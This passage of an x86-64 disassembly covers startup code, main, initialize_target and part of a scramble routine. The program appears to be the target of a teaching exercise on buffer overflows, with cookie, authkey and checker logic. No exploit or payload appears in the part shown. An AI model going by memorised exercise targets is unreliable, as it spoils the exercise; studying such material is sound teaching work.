  400e6f:	74 f4                	je     400e65 <deregister_tm_clones+0x15>
  400e71:	5d                   	pop    %rbp
  400e72:	bf b0 44 60 00       	mov    $0x6044b0,%edi
  400e77:	ff e0                	jmpq   *%rax
  400e79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400e80 <register_tm_clones>:
  400e80:	b8 b0 44 60 00       	mov    $0x6044b0,%eax
  400e85:	55                   	push   %rbp
  400e86:	48 2d b0 44 60 00    	sub    $0x6044b0,%rax
  400e8c:	48 c1 f8 03          	sar    $0x3,%rax
  400e90:	48 89 e5             	mov    %rsp,%rbp
  400e93:	48 89 c2             	mov    %rax,%rdx
  400e96:	48 c1 ea 3f          	shr    $0x3f,%rdx
  400e9a:	48 01 d0             	add    %rdx,%rax
  400e9d:	48 d1 f8             	sar    %rax
  400ea0:	75 02                	jne    400ea4 <register_tm_clones+0x24>
  400ea2:	5d                   	pop    %rbp
  400ea3:	c3                   	retq   
  400ea4:	ba 00 00 00 00       	mov    $0x0,%edx
  400ea9:	48 85 d2             	test   %rdx,%rdx
  400eac:	74 f4                	je     400ea2 <register_tm_clones+0x22>
  400eae:	5d                   	pop    %rbp
  400eaf:	48 89 c6             	mov    %rax,%rsi
  400eb2:	bf b0 44 60 00       	mov    $0x6044b0,%edi
  400eb7:	ff e2                	jmpq   *%rdx
  400eb9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400ec0 <__do_global_dtors_aux>:
  400ec0:	80 3d 11 36 20 00 00 	cmpb   $0x0,0x203611(%rip)        # 6044d8 <completed.6354>
  400ec7:	75 11                	jne    400eda <__do_global_dtors_aux+0x1a>
  400ec9:	55                   	push   %rbp
  400eca:	48 89 e5             	mov    %rsp,%rbp
  400ecd:	e8 7e ff ff ff       	callq  400e50 <deregister_tm_clones>
  400ed2:	5d                   	pop    %rbp
  400ed3:	c6 05 fe 35 20 00 01 	movb   $0x1,0x2035fe(%rip)        # 6044d8 <completed.6354>
  400eda:	f3 c3                	repz retq 
  400edc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400ee0 <frame_dummy>:
  400ee0:	48 83 3d 38 2f 20 00 	cmpq   $0x0,0x202f38(%rip)        # 603e20 <__JCR_END__>
  400ee7:	00 
  400ee8:	74 1e                	je     400f08 <frame_dummy+0x28>
  400eea:	b8 00 00 00 00       	mov    $0x0,%eax
  400eef:	48 85 c0             	test   %rax,%rax
  400ef2:	74 14                	je     400f08 <frame_dummy+0x28>
  400ef4:	55                   	push   %rbp
  400ef5:	bf 20 3e 60 00       	mov    $0x603e20,%edi
  400efa:	48 89 e5             	mov    %rsp,%rbp
  400efd:	ff d0                	callq  *%rax
  400eff:	5d                   	pop    %rbp
  400f00:	e9 7b ff ff ff       	jmpq   400e80 <register_tm_clones>
  400f05:	0f 1f 00             	nopl   (%rax)
  400f08:	e9 73 ff ff ff       	jmpq   400e80 <register_tm_clones>
  400f0d:	0f 1f 00             	nopl   (%rax)

0000000000400f10 <usage>:
  400f10:	48 83 ec 08          	sub    $0x8,%rsp
  400f14:	48 89 fe             	mov    %rdi,%rsi
  400f17:	83 3d ea 35 20 00 00 	cmpl   $0x0,0x2035ea(%rip)        # 604508 <is_checker>
  400f1e:	74 39                	je     400f59 <usage+0x49>
  400f20:	bf a0 2c 40 00       	mov    $0x402ca0,%edi
  400f25:	b8 00 00 00 00       	mov    $0x0,%eax
  400f2a:	e8 51 fd ff ff       	callq  400c80 <printf@plt>
  400f2f:	bf d8 2c 40 00       	mov    $0x402cd8,%edi
  400f34:	e8 17 fd ff ff       	callq  400c50 <puts@plt>
  400f39:	bf 50 2e 40 00       	mov    $0x402e50,%edi
  400f3e:	e8 0d fd ff ff       	callq  400c50 <puts@plt>
  400f43:	bf 00 2d 40 00       	mov    $0x402d00,%edi
  400f48:	e8 03 fd ff ff       	callq  400c50 <puts@plt>
  400f4d:	bf 6a 2e 40 00       	mov    $0x402e6a,%edi
  400f52:	e8 f9 fc ff ff       	callq  400c50 <puts@plt>
  400f57:	eb 2d                	jmp    400f86 <usage+0x76>
  400f59:	bf 86 2e 40 00       	mov    $0x402e86,%edi
  400f5e:	b8 00 00 00 00       	mov    $0x0,%eax
  400f63:	e8 18 fd ff ff       	callq  400c80 <printf@plt>
  400f68:	bf 28 2d 40 00       	mov    $0x402d28,%edi
  400f6d:	e8 de fc ff ff       	callq  400c50 <puts@plt>
  400f72:	bf 50 2d 40 00       	mov    $0x402d50,%edi
  400f77:	e8 d4 fc ff ff       	callq  400c50 <puts@plt>
  400f7c:	bf a4 2e 40 00       	mov    $0x402ea4,%edi
  400f81:	e8 ca fc ff ff       	callq  400c50 <puts@plt>
  400f86:	bf 00 00 00 00       	mov    $0x0,%edi
  400f8b:	e8 60 fe ff ff       	callq  400df0 <exit@plt>

0000000000400f90 <initialize_target>:
  400f90:	55                   	push   %rbp
  400f91:	53                   	push   %rbx
  400f92:	48 81 ec 08 21 00 00 	sub    $0x2108,%rsp
  400f99:	89 f5                	mov    %esi,%ebp
  400f9b:	89 3d 57 35 20 00    	mov    %edi,0x203557(%rip)        # 6044f8 <check_level>
  400fa1:	8b 3d c1 31 20 00    	mov    0x2031c1(%rip),%edi        # 604168 <target_id>
  400fa7:	e8 37 1c 00 00       	callq  402be3 <gencookie>
  400fac:	89 05 52 35 20 00    	mov    %eax,0x203552(%rip)        # 604504 <cookie>
  400fb2:	89 c7                	mov    %eax,%edi
  400fb4:	e8 2a 1c 00 00       	callq  402be3 <gencookie>
  400fb9:	89 05 41 35 20 00    	mov    %eax,0x203541(%rip)        # 604500 <authkey>
  400fbf:	8b 05 a3 31 20 00    	mov    0x2031a3(%rip),%eax        # 604168 <target_id>
  400fc5:	8d 78 01             	lea    0x1(%rax),%edi
  400fc8:	e8 53 fc ff ff       	callq  400c20 <srandom@plt>
  400fcd:	e8 7e fd ff ff       	callq  400d50 <random@plt>
  400fd2:	89 c7                	mov    %eax,%edi
  400fd4:	e8 ca 02 00 00       	callq  4012a3 <scramble>
  400fd9:	89 c3                	mov    %eax,%ebx
  400fdb:	85 ed                	test   %ebp,%ebp
  400fdd:	74 18                	je     400ff7 <initialize_target+0x67>
  400fdf:	bf 00 00 00 00       	mov    $0x0,%edi
  400fe4:	e8 57 fd ff ff       	callq  400d40 <time@plt>
  400fe9:	89 c7                	mov    %eax,%edi
  400feb:	e8 30 fc ff ff       	callq  400c20 <srandom@plt>
  400ff0:	e8 5b fd ff ff       	callq  400d50 <random@plt>
  400ff5:	eb 05                	jmp    400ffc <initialize_target+0x6c>
  400ff7:	b8 00 00 00 00       	mov    $0x0,%eax
  400ffc:	01 c3                	add    %eax,%ebx
  400ffe:	0f b7 db             	movzwl %bx,%ebx
  401001:	8d 04 dd 00 01 00 00 	lea    0x100(,%rbx,8),%eax
  401008:	89 c0                	mov    %eax,%eax
  40100a:	48 89 05 8f 34 20 00 	mov    %rax,0x20348f(%rip)        # 6044a0 <buf_offset>
  401011:	c6 05 10 41 20 00 63 	movb   $0x63,0x204110(%rip)        # 605128 <target_prefix>
  401018:	83 3d 89 34 20 00 00 	cmpl   $0x0,0x203489(%rip)        # 6044a8 <notify>
  40101f:	0f 84 b1 00 00 00    	je     4010d6 <initialize_target+0x146>
  401025:	83 3d dc 34 20 00 00 	cmpl   $0x0,0x2034dc(%rip)        # 604508 <is_checker>
  40102c:	0f 85 a4 00 00 00    	jne    4010d6 <initialize_target+0x146>
  401032:	be 00 01 00 00       	mov    $0x100,%esi
  401037:	48 89 e7             	mov    %rsp,%rdi
  40103a:	e8 91 fd ff ff       	callq  400dd0 <gethostname@plt>
  40103f:	85 c0                	test   %eax,%eax
  401041:	74 25                	je     401068 <initialize_target+0xd8>
  401043:	bf 80 2d 40 00       	mov    $0x402d80,%edi
  401048:	e8 03 fc ff ff       	callq  400c50 <puts@plt>
  40104d:	bf 08 00 00 00       	mov    $0x8,%edi
  401052:	e8 99 fd ff ff       	callq  400df0 <exit@plt>
  401057:	48 89 e6             	mov    %rsp,%rsi
  40105a:	e8 a1 fb ff ff       	callq  400c00 <strcasecmp@plt>
  40105f:	85 c0                	test   %eax,%eax
  401061:	74 21                	je     401084 <initialize_target+0xf4>
  401063:	83 c3 01             	add    $0x1,%ebx
  401066:	eb 05                	jmp    40106d <initialize_target+0xdd>
  401068:	bb 00 00 00 00       	mov    $0x0,%ebx
  40106d:	48 63 c3             	movslq %ebx,%rax
  401070:	48 8b 3c c5 80 41 60 	mov    0x604180(,%rax,8),%rdi
  401077:	00 
  401078:	48 85 ff             	test   %rdi,%rdi
  40107b:	75 da                	jne    401057 <initialize_target+0xc7>
  40107d:	b8 00 00 00 00       	mov    $0x0,%eax
  401082:	eb 05                	jmp    401089 <initialize_target+0xf9>
  401084:	b8 01 00 00 00       	mov    $0x1,%eax
  401089:	85 c0                	test   %eax,%eax
  40108b:	75 17                	jne    4010a4 <initialize_target+0x114>
  40108d:	48 89 e6             	mov    %rsp,%rsi
  401090:	bf b8 2d 40 00       	mov    $0x402db8,%edi
  401095:	e8 e6 fb ff ff       	callq  400c80 <printf@plt>
  40109a:	bf 08 00 00 00       	mov    $0x8,%edi
  40109f:	e8 4c fd ff ff       	callq  400df0 <exit@plt>
  4010a4:	48 8d bc 24 00 01 00 	lea    0x100(%rsp),%rdi
  4010ab:	00 
  4010ac:	e8 c9 18 00 00       	callq  40297a <init_driver>
  4010b1:	85 c0                	test   %eax,%eax
  4010b3:	79 21                	jns    4010d6 <initialize_target+0x146>
  4010b5:	48 8d b4 24 00 01 00 	lea    0x100(%rsp),%rsi
  4010bc:	00 
  4010bd:	bf f8 2d 40 00       	mov    $0x402df8,%edi
  4010c2:	b8 00 00 00 00       	mov    $0x0,%eax
  4010c7:	e8 b4 fb ff ff       	callq  400c80 <printf@plt>
  4010cc:	bf 08 00 00 00       	mov    $0x8,%edi
  4010d1:	e8 1a fd ff ff       	callq  400df0 <exit@plt>
  4010d6:	48 81 c4 08 21 00 00 	add    $0x2108,%rsp
  4010dd:	5b                   	pop    %rbx
  4010de:	5d                   	pop    %rbp
  4010df:	c3                   	retq   

00000000004010e0 <main>:
  4010e0:	41 56                	push   %r14
  4010e2:	41 55                	push   %r13
  4010e4:	41 54                	push   %r12
  4010e6:	55                   	push   %rbp
  4010e7:	53                   	push   %rbx
  4010e8:	41 89 fc             	mov    %edi,%r12d
  4010eb:	48 89 f3             	mov    %rsi,%rbx
  4010ee:	be a1 1d 40 00       	mov    $0x401da1,%esi
  4010f3:	bf 0b 00 00 00       	mov    $0xb,%edi
  4010f8:	e8 e3 fb ff ff       	callq  400ce0 <signal@plt>
  4010fd:	be 53 1d 40 00       	mov    $0x401d53,%esi
  401102:	bf 07 00 00 00       	mov    $0x7,%edi
  401107:	e8 d4 fb ff ff       	callq  400ce0 <signal@plt>
  40110c:	be ef 1d 40 00       	mov    $0x401def,%esi
  401111:	bf 04 00 00 00       	mov    $0x4,%edi
  401116:	e8 c5 fb ff ff       	callq  400ce0 <signal@plt>
  40111b:	83 3d e6 33 20 00 00 	cmpl   $0x0,0x2033e6(%rip)        # 604508 <is_checker>
  401122:	74 20                	je     401144 <main+0x64>
  401124:	be 3d 1e 40 00       	mov    $0x401e3d,%esi
  401129:	bf 0e 00 00 00       	mov    $0xe,%edi
  40112e:	e8 ad fb ff ff       	callq  400ce0 <signal@plt>
  401133:	bf 05 00 00 00       	mov    $0x5,%edi
  401138:	e8 63 fb ff ff       	callq  400ca0 <alarm@plt>
  40113d:	bd c2 2e 40 00       	mov    $0x402ec2,%ebp
  401142:	eb 05                	jmp    401149 <main+0x69>
  401144:	bd bd 2e 40 00       	mov    $0x402ebd,%ebp
  401149:	48 8b 05 70 33 20 00 	mov    0x203370(%rip),%rax        # 6044c0 <stdin@@GLIBC_2.2.5>
  401150:	48 89 05 99 33 20 00 	mov    %rax,0x203399(%rip)        # 6044f0 <infile>
  401157:	41 bd 00 00 00 00    	mov    $0x0,%r13d
  40115d:	41 be 00 00 00 00    	mov    $0x0,%r14d
  401163:	e9 b9 00 00 00       	jmpq   401221 <main+0x141>
  401168:	83 e8 61             	sub    $0x61,%eax
  40116b:	3c 10                	cmp    $0x10,%al
  40116d:	0f 87 93 00 00 00    	ja     401206 <main+0x126>
  401173:	0f b6 c0             	movzbl %al,%eax
  401176:	ff 24 c5 08 2f 40 00 	jmpq   *0x402f08(,%rax,8)
  40117d:	48 8b 3b             	mov    (%rbx),%rdi
  401180:	e8 8b fd ff ff       	callq  400f10 <usage>
  401185:	be 9d 31 40 00       	mov    $0x40319d,%esi
  40118a:	48 8b 3d 37 33 20 00 	mov    0x203337(%rip),%rdi        # 6044c8 <optarg@@GLIBC_2.2.5>
  401191:	e8 0a fc ff ff       	callq  400da0 <fopen@plt>
  401196:	48 89 05 53 33 20 00 	mov    %rax,0x203353(%rip)        # 6044f0 <infile>
  40119d:	48 85 c0             	test   %rax,%rax
  4011a0:	75 7f                	jne    401221 <main+0x141>
  4011a2:	48 8b 15 1f 33 20 00 	mov    0x20331f(%rip),%rdx        # 6044c8 <optarg@@GLIBC_2.2.5>
  4011a9:	be ca 2e 40 00       	mov    $0x402eca,%esi
  4011ae:	48 8b 3d 1b 33 20 00 	mov    0x20331b(%rip),%rdi        # 6044d0 <stderr@@GLIBC_2.2.5>
  4011b5:	e8 46 fb ff ff       	callq  400d00 <fprintf@plt>
  4011ba:	b8 01 00 00 00       	mov    $0x1,%eax
  4011bf:	e9 d6 00 00 00       	jmpq   40129a <main+0x1ba>
  4011c4:	ba 10 00 00 00       	mov    $0x10,%edx
  4011c9:	be 00 00 00 00       	mov    $0x0,%esi
  4011ce:	48 8b 3d f3 32 20 00 	mov    0x2032f3(%rip),%rdi        # 6044c8 <optarg@@GLIBC_2.2.5>
  4011d5:	e8 e6 fb ff ff       	callq  400dc0 <strtoul@plt>
  4011da:	41 89 c6             	mov    %eax,%r14d
  4011dd:	eb 42                	jmp    401221 <main+0x141>
  4011df:	ba 0a 00 00 00       	mov    $0xa,%edx
  4011e4:	be 00 00 00 00       	mov    $0x0,%esi
  4011e9:	48 8b 3d d8 32 20 00 	mov    0x2032d8(%rip),%rdi        # 6044c8 <optarg@@GLIBC_2.2.5>
  4011f0:	e8 2b fb ff ff       	callq  400d20 <strtol@plt>
  4011f5:	41 89 c5             	mov    %eax,%r13d
  4011f8:	eb 27                	jmp    401221 <main+0x141>
  4011fa:	c7 05 a4 32 20 00 00 	movl   $0x0,0x2032a4(%rip)        # 6044a8 <notify>
  401201:	00 00 00 
  401204:	eb 1b                	jmp    401221 <main+0x141>
  401206:	40 0f be f6          	movsbl %sil,%esi
  40120a:	bf e7 2e 40 00       	mov    $0x402ee7,%edi
  40120f:	b8 00 00 00 00       	mov    $0x0,%eax
  401214:	e8 67 fa ff ff       	callq  400c80 <printf@plt>
  401219:	48 8b 3b             	mov    (%rbx),%rdi
  40121c:	e8 ef fc ff ff       	callq  400f10 <usage>
  401221:	48 89 ea             	mov    %rbp,%rdx
  401224:	48 89 de             	mov    %rbx,%rsi
  401227:	44 89 e7             	mov    %r12d,%edi
  40122a:	e8 81 fb ff ff       	callq  400db0 <getopt@plt>
  40122f:	89 c6                	mov    %eax,%esi
  401231:	3c ff                	cmp    $0xff,%al
  401233:	0f 85 2f ff ff ff    	jne    401168 <main+0x88>
  401239:	be 00 00 00 00       	mov    $0x0,%esi
  40123e:	44 89 ef             	mov    %r13d,%edi
  401241:	e8 4a fd ff ff       	callq  400f90 <initialize_target>
  401246:	83 3d bb 32 20 00 00 	cmpl   $0x0,0x2032bb(%rip)        # 604508 <is_checker>
  40124d:	74 25                	je     401274 <main+0x194>
  40124f:	44 3b 35 aa 32 20 00 	cmp    0x2032aa(%rip),%r14d        # 604500 <authkey>
  401256:	74 1c                	je     401274 <main+0x194>
  401258:	44 89 f6             	mov    %r14d,%esi
  40125b:	bf 20 2e 40 00       	mov    $0x402e20,%edi
  401260:	b8 00 00 00 00       	mov    $0x0,%eax
  401265:	e8 16 fa ff ff       	callq  400c80 <printf@plt>
  40126a:	b8 00 00 00 00       	mov    $0x0,%eax
  40126f:	e8 e7 07 00 00       	callq  401a5b <check_fail>
  401274:	8b 35 8a 32 20 00    	mov    0x20328a(%rip),%esi        # 604504 <cookie>
  40127a:	bf fa 2e 40 00       	mov    $0x402efa,%edi
  40127f:	b8 00 00 00 00       	mov    $0x0,%eax
  401284:	e8 f7 f9 ff ff       	callq  400c80 <printf@plt>
  401289:	48 8b 3d 10 32 20 00 	mov    0x203210(%rip),%rdi        # 6044a0 <buf_offset>
  401290:	e8 77 0c 00 00       	callq  401f0c <stable_launch>
  401295:	b8 00 00 00 00       	mov    $0x0,%eax
  40129a:	5b                   	pop    %rbx
  40129b:	5d                   	pop    %rbp
  40129c:	41 5c                	pop    %r12
  40129e:	41 5d                	pop    %r13
  4012a0:	41 5e                	pop    %r14
  4012a2:	c3                   	retq   

00000000004012a3 <scramble>:
  4012a3:	b8 00 00 00 00       	mov    $0x0,%eax
  4012a8:	eb 11                	jmp    4012bb <scramble+0x18>
  4012aa:	69 c8 1e 0d 00 00    	imul   $0xd1e,%eax,%ecx
  4012b0:	01 f9                	add    %edi,%ecx
  4012b2:	89 c2                	mov    %eax,%edx
  4012b4:	89 4c 94 d0          	mov    %ecx,-0x30(%rsp,%rdx,4)
  4012b8:	83 c0 01             	add    $0x1,%eax
  4012bb:	83 f8 09             	cmp    $0x9,%eax
  4012be:	76 ea                	jbe    4012aa <scramble+0x7>
  4012c0:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4012c4:	69 c0 4f 21 00 00    	imul   $0x214f,%eax,%eax
  4012ca:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4012ce:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  4012d2:	69 c0 04 31 00 00    	imul   $0x3104,%eax,%eax
  4012d8:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  4012dc:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4012e0:	69 c0 c7 7b 00 00    	imul   $0x7bc7,%eax,%eax
  4012e6:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4012ea:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4012ee:	69 c0 e4 0a 00 00    	imul   $0xae4,%eax,%eax
  4012f4:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4012f8:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4012fc:	69 c0 c2 e7 00 00    	imul   $0xe7c2,%eax,%eax
  401302:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401306:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  40130a:	69 c0 ba c1 00 00    	imul   $0xc1ba,%eax,%eax
  401310:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401314:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401318:	69 c0 ea 5e 00 00    	imul   $0x5eea,%eax,%eax
  40131e:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  401322:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  401326:	69 c0 7a de 00 00    	imul   $0xde7a,%eax,%eax
  40132c:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  401330:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401334:	69 c0 6d 94 00 00    	imul   $0x946d,%eax,%eax
  40133a:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40133e:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401342:	69 c0 84 e0 00 00    	imul   $0xe084,%eax,%eax
  401348:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  40134c:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  401350:	69 c0 5b e9 00 00    	imul   $0xe95b,%eax,%eax
  401356:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  40135a:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  40135e:	69 c0 f8 c0 00 00    	imul   $0xc0f8,%eax,%eax
  401364:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401368:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  40136c:	69 c0 7b a6 00 00    	imul   $0xa67b,%eax,%eax
  401372:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401376:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  40137a:	69 c0 9e 1c 00 00    	imul   $0x1c9e,%eax,%eax
  401380:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  401384:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401388:	69 c0 14 42 00 00    	imul   $0x4214,%eax,%eax
  40138e:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  401392:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  401396:	69 c0 bf 40 00 00    	imul   $0x40bf,%eax,%eax
  40139c:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4013a0:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4013a4:	69 c0 d4 cc 00 00    	imul   $0xccd4,%eax,%eax
  4013aa:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4013ae:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4013b2:	69 c0 92 e2 00 00    	imul   $0xe292,%eax,%eax
  4013b8:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4013bc:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  4013c0:	69 c0 4b ce 00 00    	imul   $0xce4b,%eax,%eax
  4013c6:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  4013ca:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4013ce:	69 c0 f9 3c 00 00    	imul   $0x3cf9,%eax,%eax
  4013d4:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4013d8:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  4013dc:	69 c0 23 68 00 00    	imul   $0x6823,%eax,%eax
  4013e2:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4013e6:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4013ea:	69 c0 27 a1 00 00    	imul   $0xa127,%eax,%eax
  4013f0:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4013f4:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4013f8:	69 c0 62 04 00 00    	imul   $0x462,%eax,%eax
  4013fe:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  401402:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  401406:	69 c0 18 f2 00 00    	imul   $0xf218,%eax,%eax
  40140c:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  401410:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  401414:	69 c0 34 14 00 00    	imul   $0x1434,%eax,%eax
  40141a:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  40141e:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401422:	69 c0 27 34 00 00    	imul   $0x3427,%eax,%eax
  401428:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  40142c:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401430:	69 c0 28 4a 00 00    	imul   $0x4a28,%eax,%eax
  401436:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  40143a:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  40143e:	69 c0 47 dd 00 00    	imul   $0xdd47,%eax,%eax
  401444:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401448:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  40144c:	69 c0 1d 2e 00 00    	imul   $0x2e1d,%eax,%eax
  401452:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401456:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  40145a:	69 c0 44 24 00 00    	imul   $0x2444,%eax,%eax
  401460:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401464:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  401468:	69 c0 da f1 00 00    	imul   $0xf1da,%eax,%eax
  40146e:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  401472:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  401476:	69 c0 95 d3 00 00    	imul   $0xd395,%eax,%eax
  40147c:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  401480:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401484:	69 c0 c6 d6 00 00    	imul   $0xd6c6,%eax,%eax
  40148a:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40148e:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  401492:	69 c0 4b 07 00 00    	imul   $0x74b,%eax,%eax
  401498:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  40149c:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  4014a0:	69 c0 9d a3 00 00    	imul   $0xa39d,%eax,%eax
  4014a6:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  4014aa:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  4014ae:	69 c0 1e 5b 00 00    	imul   $0x5b1e,%eax,%eax
  4014b4:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  4014b8:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  4014bc:	69 c0 f7 42 00 00    	imul   $0x42f7,%eax,%eax
  4014c2:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4014c6:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  4014ca:	69 c0 ce d2 00 00    	imul   $0xd2ce,%eax,%eax
  4014d0:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  4014d4:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  4014d8:	69 c0 e6 7b 00 00    	imul   $0x7be6,%eax,%eax
  4014de:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  4014e2:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  4014e6:	69 c0 2a e0 00 00    	imul   $0xe02a,%eax,%eax
  4014ec:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  4014f0:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
  4014f4:	69 c0 83 97 00 00    	imul   $0x9783,%eax,%eax
  4014fa:	89 44 24 dc          	mov    %eax,-0x24(%rsp)
  4014fe:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401502:	69 c0 aa 8d 00 00    	imul   $0x8daa,%eax,%eax
  401508:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  40150c:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  401510:	69 c0 71 09 00 00    	imul   $0x971,%eax,%eax
  401516:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  40151a:	8b 44 24 d8          	mov    -0x28(%rsp),%eax
  40151e:	69 c0 4e d2 00 00    	imul   $0xd24e,%eax,%eax
  401524:	89 44 24 d8          	mov    %eax,-0x28(%rsp)
  401528:	8b 44 24 e0          	mov    -0x20(%rsp),%eax
  40152c:	69 c0 d6 64 00 00    	imul   $0x64d6,%eax,%eax
  401532:	89 44 24 e0          	mov    %eax,-0x20(%rsp)
  401536:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  40153a:	69 c0 bf a7 00 00    	imul   $0xa7bf,%eax,%eax
  401540:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401544:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  401548:	69 c0 95 5b 00 00    	imul   $0x5b95,%eax,%eax
  40154e:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  401552:	8b 44 24 ec          	mov    -0x14(%rsp),%eax
  401556:	69 c0 60 15 00 00    	imul   $0x1560,%eax,%eax
  40155c:	89 44 24 ec          	mov    %eax,-0x14(%rsp)
  401560:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  401564:	69 c0 7c 31 00 00    	imul   $0x317c,%eax,%eax
  40156a:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  40156e:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  401572:	69 c0 6c d7 00 00    	imul   $0xd76c,%eax,%eax
  401578:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  40157c:	8b 44 24 e8          	mov    -0x18(%rsp),%eax
  401580:	69 c0 ef 60 00 00    	imul   $0x60ef,%eax,%eax
  401586:	89 44 24 e8          	mov    %eax,-0x18(%rsp)
  40158a:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  40158e:	69 c0 db e0 00 00    	imul   $0xe0db,%eax,%eax
  401594:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  401598:	8b 44 24 e4          	mov    -0x1c(%rsp),%eax
  40159c:	69 c0 cf 2e 00 00    	imul   $0x2ecf,%eax,%eax
  4015a2:	89 44 24 e4          	mov    %eax,-0x1c(%rsp)
  4015a6:	8b 44 24 d4          	mov    -0x2c(%rsp),%eax
  4015aa:	69 c0 40 eb 00 00    	imul   $0xeb40,%eax,%eax
  4015b0:	89 44 24 d4          	mov    %eax,-0x2c(%rsp)
  4015b4:	8b 44 24 f0          	mov    -0x10(%rsp),%eax
  4015b8:	69 c0 90 78 00 00    	imul   $0x7890,%eax,%eax
  4015be:	89 44 24 f0          	mov    %eax,-0x10(%rsp)
  4015c2:	8b 44 24 f4          	mov    -0xc(%rsp),%eax
  4015c6:	69 c0 d0 3a 00 00    	imul   $0x3ad0,%eax,%eax
  4015cc:	89 44 24 f4          	mov    %eax,-0xc(%rsp)
  4015d0:	8b 44 24 d0          	mov    -0x30(%rsp),%eax
  4015d4:	69 c0 bc df 00 00    	imul   $0xdfbc,%eax,%eax
  4015da:	89 44 24 d0          	mov    %eax,-0x30(%rsp)
  4015de:	8b 44 24 dc          	mov    -0x24(%rsp),%eax
